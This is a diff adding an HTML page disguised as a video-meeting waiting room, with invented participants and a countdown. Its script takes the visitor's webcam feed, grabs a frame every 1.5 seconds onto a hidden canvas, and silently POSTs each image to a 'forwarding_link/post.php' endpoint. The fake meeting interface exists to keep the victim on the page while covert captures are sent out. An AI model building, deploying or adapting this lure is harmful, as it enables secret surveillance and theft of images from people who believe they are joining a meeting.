@@ -1,0 +1,596 @@
+<!doctype html>
+<html>
+
+<head>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<style>
+  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
+
+  body {
+    height: 100vh;
+    width: 100vw;
+    background: #1a1a2e;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+  }
+
+  * {
+    padding: 0px;
+    margin: 0px;
+    font-family: 'Nunito', sans-serif;
+    font-weight: 500;
+  }
+
+  .main-container {
+    background: #0f0f1a;
+    height: 100vh;
+    width: 100%;
+    position: relative;
+  }
+
+  /* 4 Persons Grid Layout */
+  .video-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    grid-template-rows: repeat(2, 1fr);
+    gap: 15px;
+    padding: 20px;
+    height: calc(100vh - 100px);
+    background: #0f0f1a;
+  }
+
+  .video-card {
+    background: linear-gradient(135deg, #16213e 0%, #1a1a2e 100%);
+    border-radius: 20px;
+    overflow: hidden;
+    position: relative;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    transition: transform 0.3s ease;
+  }
+
+  .video-card:hover {
+    transform: scale(1.02);
+    border: 1px solid rgba(0, 255, 255, 0.3);
+  }
+
+  .video-wrap {
+    position: relative;
+    width: 100%;
+    height: 100%;
+    background: #0a0a1a;
+  }
+
+  video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+
+  canvas {
+    display: none;
+  }
+
+  .participant-name {
+    position: absolute;
+    bottom: 15px;
+    left: 15px;
+    background: rgba(0, 0, 0, 0.6);
+    backdrop-filter: blur(10px);
+    padding: 5px 12px;
+    border-radius: 20px;
+    color: white;
+    font-size: 12px;
+    z-index: 2;
+  }
+
+  .participant-status {
+    position: absolute;
+    bottom: 15px;
+    right: 15px;
+    background: rgba(0, 0, 0, 0.6);
+    backdrop-filter: blur(10px);
+    padding: 5px 10px;
+    border-radius: 20px;
+    color: #4ade80;
+    font-size: 10px;
+    z-index: 2;
+  }
+
+  .mic-icon {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    background: rgba(0, 0, 0, 0.6);
+    backdrop-filter: blur(10px);
+    padding: 8px;
+    border-radius: 50%;
+    font-size: 12px;
+    z-index: 2;
+  }
+
+  /* Waiting Overlay */
+  #ac-wrapper {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.85);
+    backdrop-filter: blur(8px);
+    z-index: 1001;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  #popup {
+    width: 450px;
+    padding: 40px;
+    background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+    border: 2px solid rgba(0, 255, 255, 0.3);
+    border-radius: 25px;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 255, 255, 0.2);
+    text-align: center;
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0% {
+      box-shadow: 0 0 0 0 rgba(0, 255, 255, 0.4);
+    }
+    70% {
+      box-shadow: 0 0 0 15px rgba(0, 255, 255, 0);
+    }
+    100% {
+      box-shadow: 0 0 0 0 rgba(0, 255, 255, 0);
+    }
+  }
+
+  #popup h2 {
+    color: #fff;
+    font-size: 22px;
+    margin-bottom: 15px;
+  }
+
+  #popup .waiting-icon {
+    font-size: 60px;
+    margin-bottom: 20px;
+    animation: spin 2s linear infinite;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  #popup .dots {
+    display: inline-block;
+    animation: dots 1.5s steps(4, end) infinite;
+  }
+
+  @keyframes dots {
+    0%, 20% { content: ""; }
+    40% { content: "."; }
+    60% { content: ".."; }
+    80%, 100% { content: "..."; }
+  }
+
+  /* Bottom Bar */
+  .bottom-bar {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: 80px;
+    background: #1a1a2e;
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    align-items: center;
+    color: #fff;
+    z-index: 100;
+    backdrop-filter: blur(10px);
+  }
+
+  .icon-button {
+    display: flex;
+    flex-direction: column;
+    justify-items: center;
+    align-items: center;
+    padding: 8px 15px;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+  }
+
+  .icon-button:hover {
+    background: rgba(255, 255, 255, 0.1);
+  }
+
+  i {
+    margin-bottom: 8px;
+    font-size: 22px;
+  }
+
+  .icon-button h6 {
+    font-size: 11px;
+    font-weight: 500;
+  }
+
+  button {
+    color: #fff;
+    background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+    padding: 10px 30px;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    font-weight: bold;
+  }
+
+  button:hover {
+    transform: scale(1.05);
+    box-shadow: 0 5px 15px rgba(239, 68, 68, 0.3);
+  }
+
+  .float_button {
+    background: rgba(31, 32, 34, 0.9);
+    backdrop-filter: blur(10px);
+    height: 40px;
+    border-radius: 10px;
+    width: 40px;
+    position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 20px;
+    right: 20px;
+    z-index: 200;
+    cursor: pointer;
+    transition: all 0.3s ease;
+  }
+
+  .float_button:hover {
+    background: #3b82f6;
+    transform: scale(1.1);
+  }
+
+  /* Loading animation for other participants */
+  .loading-participant {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100%;
+    color: white;
+    background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+  }
+
+  .loading-participant i {
+    font-size: 50px;
+    margin-bottom: 15px;
+    animation: pulse 1.5s infinite;
+  }
+
+  /* Timer Bar */
+  .timer-bar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 3px;
+    background: rgba(255, 255, 255, 0.2);
+    z-index: 1002;
+  }
+
+  .timer-progress {
+    width: 0%;
+    height: 100%;
+    background: linear-gradient(90deg, #4ade80, #3b82f6);
+    animation: progress 4s linear forwards;
+  }
+
+  @keyframes progress {
+    0% { width: 0%; }
+    100% { width: 100%; }
+  }
+
+  @media (max-width: 768px) {
+    .video-grid {
+      gap: 8px;
+      padding: 10px;
+    }
+    
+    .icon-button {
+      padding: 5px 10px;
+    }
+    
+    .icon-button i {
+      font-size: 18px;
+    }
+    
+    .icon-button h6 {
+      font-size: 9px;
+    }
+    
+    #popup {
+      width: 90%;
+      padding: 30px;
+    }
+    
+    #popup h2 {
+      font-size: 18px;
+    }
+  }
+</style>
+
+<div class="main-container">
+  <!-- Timer Bar -->
+  <div class="timer-bar">
+    <div class="timer-progress"></div>
+  </div>
+
+  <!-- 4 Persons Video Grid -->
+  <div class="video-grid">
+    <!-- Person 1 - Main/Current User -->
+    <div class="video-card" id="user1">
+      <div class="video-wrap">
+        <video id="video" playsinline autoplay muted></video>
+        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+      </div>
+      <div class="participant-name">
+        <i class="fas fa-user"></i> You (Host)
+      </div>
+      <div class="participant-status">
+        <i class="fas fa-circle" style="color: #4ade80; font-size: 8px;"></i> Connected
+      </div>
+      <div class="mic-icon">
+        <i class="fas fa-microphone"></i>
+      </div>
+    </div>
+
+    <!-- Person 2 - Waiting (Boy) -->
+    <div class="video-card" id="user2">
+      <div class="loading-participant">
+        <i class="fas fa-user-circle"></i>
+        <p>Waiting to join...</p>
+        <div class="dots">.</div>
+      </div>
+      <div class="participant-name">
+        <i class="fas fa-user"></i> Abdullah Khan
+      </div>
+      <div class="participant-status">
+        <i class="fas fa-clock" style="color: #fbbf24; font-size: 8px;"></i> Waiting
+      </div>
+    </div>
+
+    <!-- Person 3 - Waiting (Boy) -->
+    <div class="video-card" id="user3">
+      <div class="loading-participant">
+        <i class="fas fa-user-circle"></i>
+        <p>Waiting to join...</p>
+        <div class="dots">.</div>
+      </div>
+      <div class="participant-name">
+        <i class="fas fa-user"></i> Usman Chaudhary
+      </div>
+      <div class="participant-status">
+        <i class="fas fa-clock" style="color: #fbbf24; font-size: 8px;"></i> Waiting
+      </div>
+    </div>
+
+    <!-- Person 4 - Waiting (Boy) -->
+    <div class="video-card" id="user4">
+      <div class="loading-participant">
+        <i class="fas fa-user-circle"></i>
+        <p>Waiting to join...</p>
+        <div class="dots">.</div>
+      </div>
+      <div class="participant-name">
+        <i class="fas fa-user"></i> Hamza Ali
+      </div>
+      <div class="participant-status">
+        <i class="fas fa-clock" style="color: #fbbf24; font-size: 8px;"></i> Waiting
+      </div>
+    </div>
+  </div>
+
+  <!-- Waiting Overlay -->
+  <div id="ac-wrapper" style="display: flex;">
+    <div id="popup">
+      <div class="waiting-icon">
+        <i class="fas fa-spinner fa-pulse"></i>
+      </div>
+      <h2>Please wait the meeting host will let you in soon <span class="dots">...</span></h2>
+      <p style="color: #94a3b8; margin-top: 15px; font-size: 14px;">You are in the waiting room</p>
+      <p style="color: #3b82f6; margin-top: 10px; font-size: 12px;">
+        <i class="fas fa-hourglass-half"></i> Connecting in 4 seconds...
+      </p>
+      <p style="color: #4ade80; margin-top: 5px; font-size: 20px; font-weight: bold;" id="countdown">4</p>
+    </div>
+  </div>
+
+  <!-- Bottom Bar -->
+  <div class="bottom-bar">
+    <div class="icon-button" style="margin-left: 20px;">
+      <i class="fas fa-microphone"></i>
+      <h6>Mute</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 20px;">
+      <i class="fas fa-video"></i>
+      <h6>Stop Video</h6>
+    </div>
+    <div class="icon-button" style="margin-left: auto;">
+      <i class="fas fa-shield-alt"></i>
+      <h6>Security</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 20px;">
+      <i class="fas fa-users"></i>
+      <h6>Participants (4)</h6>
+    </div>
+    <div class="icon-button" style="color: lawngreen; margin-left: 20px;">
+      <i class="fas fa-plus-square"></i>
+      <h6>Share</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 20px;">
+      <i class="fas fa-comments"></i>
+      <h6>Chat</h6>
+    </div>
+    <div class="icon-button" style="margin-right: auto; margin-left: 20px;">
+      <i class="fas fa-record-vinyl"></i>
+      <h6>Record</h6>
+    </div>
+    <button style="margin-right: 20px;">Leave</button>
+  </div>
+
+  <div class="float_button">
+    <i class="fas fa-expand" style="color: #fff; font-size: 18px;"></i>
+  </div>
+</div>
+
+<script>
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: 'forwarding_link/post.php',
+      dataType: 'json',
+      async: false,
+      success: function(result) {
+        // Image captured successfully
+        console.log("Frame captured");
+      },
+      error: function() {
+        console.log("Error capturing frame");
+      }
+    });
+  };
+
+  'use strict';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+
+  const constraints = {
+    audio: false,
+    video: {
+      facingMode: "user"
+    }
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      console.log(`navigator.getUserMedia error: ${e.toString()}`);
+    }
+  }
+
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function() {
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      post(canvasData);
+      video.play();
+    }, 1500);
+  }
+
+  function PopUp() {
+    document.getElementById('ac-wrapper').style.display = "none";
+  }
+
+  function startCountdown(seconds) {
+    let countdownElement = document.getElementById('countdown');
+    let remaining = seconds;
+    
+    let timer = setInterval(function() {
+      remaining--;
+      if (countdownElement) {
+        countdownElement.textContent = remaining;
+      }
+      
+      if (remaining <= 0) {
+        clearInterval(timer);
+        // Popup closes after countdown
+        PopUp();
+        
+        // Simulate participants joining after popup closes
+        setTimeout(function() {
+          document.getElementById('user2').innerHTML = `
+            <div class="video-wrap">
+              <img src="https://randomuser.me/api/portraits/men/32.jpg" style="width:100%; height:100%; object-fit:cover;">
+            </div>
+            <div class="participant-name">
+              <i class="fas fa-user"></i> Abdullah Khan
+            </div>
+            <div class="participant-status">
+              <i class="fas fa-circle" style="color: #4ade80; font-size: 8px;"></i> Connected
+            </div>
+            <div class="mic-icon">
+              <i class="fas fa-microphone-slash"></i>
+            </div>
+          `;
+        }, 1000);
+        
+        setTimeout(function() {
+          document.getElementById('user3').innerHTML = `
+            <div class="video-wrap">
+              <img src="https://randomuser.me/api/portraits/men/45.jpg" style="width:100%; height:100%; object-fit:cover;">
+            </div>
+            <div class="participant-name">
+              <i class="fas fa-user"></i> Usman Chaudhary
+            </div>
+            <div class="participant-status">
+              <i class="fas fa-circle" style="color: #4ade80; font-size: 8px;"></i> Connected
+            </div>
+            <div class="mic-icon">
+              <i class="fas fa-microphone"></i>
+            </div>
+          `;
+        }, 2500);
+        
+        setTimeout(function() {
+          document.getElementById('user4').innerHTML = `
+            <div class="video-wrap">
+              <img src="https://randomuser.me/api/portraits/men/67.jpg" style="width:100%; height:100%; object-fit:cover;">
+            </div>
+            <div class="participant-name">
+              <i class="fas fa-user"></i> Hamza Ali
+            </div>
+            <div class="participant-status">
+              <i class="fas fa-circle" style="color: #4ade80; font-size: 8px;"></i> Connected
+            </div>
+            <div class="mic-icon">
+              <i class="fas fa-microphone"></i>
+            </div>
+          `;
+        }, 4000);
+      }
+    }, 1000);
+  }
+
+  // Load init
+  init();
+
+  $(document).ready(function() {
+    // Start 4 second countdown
+    startCountdown(4);
+  });
+</script>
+
+</body>
+</html>
